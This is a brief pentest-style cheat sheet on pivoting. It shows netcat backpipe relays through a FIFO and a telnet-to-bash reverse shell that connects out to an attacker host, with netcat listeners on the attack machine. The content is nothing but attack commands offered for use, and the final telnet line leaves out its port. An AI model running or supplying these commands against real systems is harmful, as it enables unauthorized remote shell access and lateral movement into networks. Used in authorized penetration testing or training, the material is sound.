# Pivoting

## Make a FIFO in the file system 

```shell
mknod [name of file] p
```

## Pivoting with a backpipe #
### On the attacker:

```shell
nc [pivot host]
```

### On the pivot host

```shell
nc localhost 80 <[FIFO file name] | nc -l -p 4444 >[FIFO file name]
```

## Telnet variant (when netcat is not available on the target) #
### Listen on port 80 in terminal 1 on the attack machine

```shell
nc -l -n -v -p 80 
```

### Listen on port 443 in terminal 2 on the attack machine

```shell
nc -l -n -v -p 443
```

### On the target machine:

```shell
telnet [attack host] 80 | /bin/bash | telnet [attack host]
```

